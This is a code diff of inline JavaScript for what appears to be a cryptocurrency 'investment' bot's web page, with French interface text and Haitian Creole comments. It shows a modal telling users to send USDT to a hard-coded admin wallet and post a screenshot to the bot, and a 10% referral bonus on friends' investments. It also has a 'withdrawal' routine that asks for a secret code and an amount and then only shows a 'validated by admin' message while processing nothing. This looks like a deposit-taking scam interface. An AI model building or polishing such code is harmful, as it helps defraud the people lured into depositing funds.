@@ -1,61 +1,57 @@
 
-        let config = {
-            retraitOuvert: true, 
-            minRetrait: 5.0,
-            adminWallet: "0x7fD50dAAfeA0a8Df3E4860ECC81939fFBaa11396"
-        };
+<script>
+    let config = {
+        retraitOuvert: true, 
+        minRetrait: 5.0,
+        adminWallet: "0x7fD50dAAfeA0a8Df3E4860ECC81939fFBaa11396"
+    };
 
-        // Fonksyon pou kopye adrès la otomatikman
-        function copyWallet() {
-            navigator.clipboard.writeText(config.adminWallet).then(function() {
-                alert("✅ Adresse copiée avec succès !");
-            }, function(err) {
-                alert("❌ Erreur lors de la copie.");
-            });
+    function copyWallet() {
+        // Metòd sa a mache sou tout telefòn
+        const el = document.createElement('textarea');
+        el.value = config.adminWallet;
+        document.body.appendChild(el);
+        el.select();
+        document.execCommand('copy');
+        document.body.removeChild(el);
+        alert("✅ Adresse copiée !");
+    }
+
+    function showDepot() {
+        let modalHtml = '<div id="custom-modal" style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); display:flex; align-items:center; justify-content:center; z-index:10000; padding:20px; box-sizing:border-box;">' +
+            '<div style="background:white; color:#333; padding:25px; border-radius:20px; width:100%; max-width:400px; text-align:center;">' +
+                '<h3 style="color:#9c126d; margin-top:0;">📥 DÉPÔT USDT (BEP20)</h3>' +
+                '<p style="font-size:14px; color:#666;">Envoyez vos fonds à cette adresse :</p>' +
+                '<div style="background:#f4f4f4; padding:15px; border-radius:10px; word-break:break-all; font-family:monospace; font-size:13px; border:1px solid #ddd; margin:15px 0; font-weight:bold;">' + config.adminWallet + '</div>' +
+                '<button onclick="copyWallet()" style="background:#27ae60; color:white; border:none; padding:12px 20px; border-radius:10px; font-weight:bold; cursor:pointer; width:100%; margin-bottom:10px;">📋 Copier l\'adresse</button>' +
+                '<p style="font-size:12px; color:#e67e22; font-weight:bold;">⚠️ Envoyez la capture d\'écran au bot après le transfert.</p>' +
+                '<button onclick="document.getElementById(\'custom-modal\').remove()" style="background:#bdc3c7; color:white; border:none; padding:10px; border-radius:10px; cursor:pointer; width:100%; margin-top:10px;">Fermer</button>' +
+            '</div>' +
+        '</div>';
+        document.body.insertAdjacentHTML('beforeend', modalHtml);
+    }
+
+    function showInvite() {
+        alert("👥 PARRAINAGE\n\nPartagez votre lien de parrainage du bot. Vous gagnez 10% de bonus sur chaque investissement de vos amis !");
+    }
+
+    function startWithdraw() {
+        if (!config.retraitOuvert) {
+            alert("⚠️ Maintenance : Les retraits sont suspendus pour 24h.");
+            return;
         }
-
-        function showDepot() {
-            // Nou kreye yon popup ki pi bèl pase alert() senp lan
-            let modalHtml = `
-                <div id="custom-modal" style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); display:flex; align-items:center; justify-content:center; z-index:10000; padding:20px; box-sizing:border-box;">
-                    <div style="background:white; color:#333; padding:25px; border-radius:20px; width:100%; max-width:400px; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.5);">
-                        <h3 style="color:#9c126d; margin-top:0;">📥 DÉPÔT USDT (BEP20)</h3>
-                        <p style="font-size:14px; color:#666;">Envoyez vos fonds à cette adresse :</p>
-                        <div style="background:#f4f4f4; padding:15px; border-radius:10px; word-break:break-all; font-family:monospace; font-size:13px; border:1px solid #ddd; margin:15px 0; font-weight:bold;">
-                            ${config.adminWallet}
-                        </div>
-                        <button onclick="copyWallet()" style="background:#27ae60; color:white; border:none; padding:12px 20px; border-radius:10px; font-weight:bold; cursor:pointer; width:100%; margin-bottom:10px;">📋 Copier l'adresse</button>
-                        <p style="font-size:12px; color:#e67e22; font-weight:bold;">⚠️ Envoyez la capture d'écran au bot après le transfert.</p>
-                        <button onclick="document.getElementById('custom-modal').remove()" style="background:#bdc3c7; color:white; border:none; padding:10px; border-radius:10px; cursor:pointer; width:100%; margin-top:10px;">Fermer</button>
-                    </div>
-                </div>
-            `;
-            document.body.insertAdjacentHTML('beforeend', modalHtml);
-        }
-
-        function showInvite() {
-            alert("👥 PARRAINAGE\n\nPartagez votre lien de parrainage du bot. Vous gagnez 10% de bonus sur chaque investissement de vos amis !");
-        }
-
-        function startWithdraw() {
-            if (!config.retraitOuvert) {
-                alert("⚠️ Maintenance : Les retraits sont suspendus pour 24h.");
-                return;
-            }
-            let code = prompt("🔒 SÉCURITÉ : Entrez votre code de retrait secret (4 chiffres) :");
-            if (code && code.length >= 4) {
-                let mnt = prompt("Montant à retirer (Minimum $5.00) :");
-                if (parseFloat(mnt) >= config.minRetrait) {
-                    alert("✅ Demande envoyée ! Le montant de $" + mnt + " sera validé par l'admin.");
-                } else {
-                    alert("❌ Le montant minimum est de $5.00");
-                }
-            } else if (code !== null) {
-                alert("❌ Code invalide.");
+        let code = prompt("🔒 SÉCURITÉ : Entrez votre code de retrait secret (4 chiffres) :");
+        if (code && code.length >= 4) {
+            let mnt = prompt("Montant à retirer (Minimum $5.00) :");
+            if (parseFloat(mnt) >= config.minRetrait) {
+                alert("✅ Demande envoyée ! Le montant de $" + mnt + " sera validé par l'admin.");
+            } else {
+                alert("❌ Le montant minimum est de $5.00");
             }
         }
+    }
 
-        function activateVIP(id) {
-            alert("🚀 Activation VIP " + id + "...\nVérification de votre solde en cours.\n\nSi votre solde est suffisant, contactez l'admin pour l'activation.");
-        }
-
+    function activateVIP(id) {
+        alert("🚀 Activation VIP " + id + "...\nVérification de votre solde en cours.");
+    }
+</script>
